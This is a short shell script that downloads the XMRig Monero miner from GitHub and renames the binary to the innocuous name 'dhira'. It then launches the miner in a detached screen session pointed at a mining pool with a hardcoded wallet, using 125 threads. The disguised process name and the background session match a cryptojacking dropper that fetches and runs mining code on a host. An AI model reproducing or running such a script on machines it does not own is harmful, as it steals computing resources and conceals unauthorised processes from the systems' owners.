#!/bin/sh
#

#xxx
yum update
yum install screen -y
yum install wget -y
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz
tar xf xmrig-6.16.4-linux-x64.tar.gz 
cd xmrig-6.16.4
mv xmrig dhira
screen ./dhira -o pool.hashvault.pro:3333 -u SuboKsvr3XLAsvWtcgppXpXWkMuhjQnE1K9VYFk5m7Y7aX3fZX4qwLXWtzvgqpH8pT4svmTa1FmZyZ7p8ZDKMnAg7pXEW5TiS8 -p qwik -a -k  --donate-level=1 -t 125

